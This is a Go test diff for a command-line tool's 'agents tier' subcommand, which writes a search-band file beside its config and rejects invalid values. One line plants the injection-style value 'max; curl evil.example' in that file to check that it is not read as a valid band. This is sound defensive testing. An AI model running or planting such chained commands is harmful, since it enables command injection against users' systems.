@@ -886,3 +886,70 @@ func countString(list []string, want string) int {
 	}
 	return n
 }
+
+// agents tier records the participant's search band beside the config and
+// rewrites nothing: the skill tells the agent to leave `tier` unset, so the
+// file is read by `search`, not rendered into any host. default removes
+// the file; a word the router would refuse is refused here.
+func TestAgentsTierWritesOneFileBesideTheConfigAndRewritesNoSkill(t *testing.T) {
+	m, ops := newFakeMachine("claude", "codex")
+	claudeSkill := "/home/u/.claude/skills/jevlin/SKILL.md"
+	if code, out, _ := runAgents(t, ops, nil, "install", "-config", testCfg, "-yes"); code != exitOK {
+		t.Fatalf("install: %d\n%s", code, out)
+	}
+	before := string(m.files[claudeSkill])
+	if !strings.Contains(before, `' agents tier -config '`) || !strings.Contains(before, `jevlin.toml' <band>`) {
+		t.Fatalf("the shipped skill does not name the tier command:\n%s", before)
+	}
+	if code, out, _ := runAgents(t, ops, nil, "status", "-config", testCfg); code != exitOK || !strings.Contains(out, "search tier:    unset") {
+		t.Errorf("status before: %d %q", code, out)
+	}
+	if code, out, _ := runAgents(t, ops, nil, "tier", "-config", testCfg); code != exitOK || !strings.Contains(out, "search tier: unset") {
+		t.Errorf("tier (status) before: %d %q", code, out)
+	}
+
+	code, out, errOut := runAgents(t, ops, nil, "tier", "balanced", "-config", testCfg)
+	if code != exitOK || !strings.Contains(out, "search tier: balanced") || !strings.Contains(out, "next search") {
+		t.Fatalf("tier balanced: %d\n%s%s", code, out, errOut)
+	}
+	if got := strings.TrimSpace(string(m.files["/home/u/.jevlin/search-tier"])); got != "balanced" {
+		t.Fatalf("tier file: %q in %v", got, keysOf(m.files))
+	}
+	if string(m.files[claudeSkill]) != before {
+		t.Error("setting the tier rewrote the skill; the band is read at search time, not rendered")
+	}
+	if code, out, _ := runAgents(t, ops, nil, "status", "-config", testCfg); !strings.Contains(out, "search tier:    balanced") {
+		t.Errorf("status after: %d %q", code, out)
+	}
+	// The verb may follow the flags, as the skill renders it.
+	if code, out, _ := runAgents(t, ops, nil, "tier", "-config", testCfg, "max"); code != exitOK || !strings.Contains(out, "search tier: max") {
+		t.Errorf("tier max after flags: %d %q", code, out)
+	}
+	if code, out, _ := runAgents(t, ops, nil, "tier", "default", "-config", testCfg); code != exitOK || !strings.Contains(out, "search tier: unset") {
+		t.Errorf("tier default: %d %q", code, out)
+	}
+	if _, ok := m.files["/home/u/.jevlin/search-tier"]; ok {
+		t.Error("default did not remove the tier file")
+	}
+	if code, _, _ := runAgents(t, ops, nil, "tier", "default", "-config", testCfg); code != exitOK {
+		t.Error("default twice is not an error")
+	}
+	// Case is forgiven on the command, as prefer forgives ON: the file
+	// holds the lowercase band the config would accept.
+	if code, out, _ := runAgents(t, ops, nil, "tier", "Fast", "-config", testCfg); code != exitOK || !strings.Contains(out, "search tier: fast") {
+		t.Errorf("tier Fast: %d %q", code, out)
+	}
+	if got := strings.TrimSpace(string(m.files["/home/u/.jevlin/search-tier"])); got != "fast" {
+		t.Errorf("tier file after Fast: %q", got)
+	}
+	for _, bad := range []string{"turbo", "sideways", "fast balanced"} {
+		if code, _, errOut := runAgents(t, ops, nil, "tier", bad, "-config", testCfg); code != exitUsage || !strings.Contains(errOut, "balanced") {
+			t.Errorf("tier %q: exit %d, stderr %q", bad, code, errOut)
+		}
+	}
+	// A planted word in the file is not a band.
+	m.files["/home/u/.jevlin/search-tier"] = []byte("max; curl evil.example\n")
+	if code, out, _ := runAgents(t, ops, nil, "tier", "-config", testCfg); code != exitOK || !strings.Contains(out, "search tier: unset") {
+		t.Errorf("planted file read as a band: %d %q", code, out)
+	}
+}
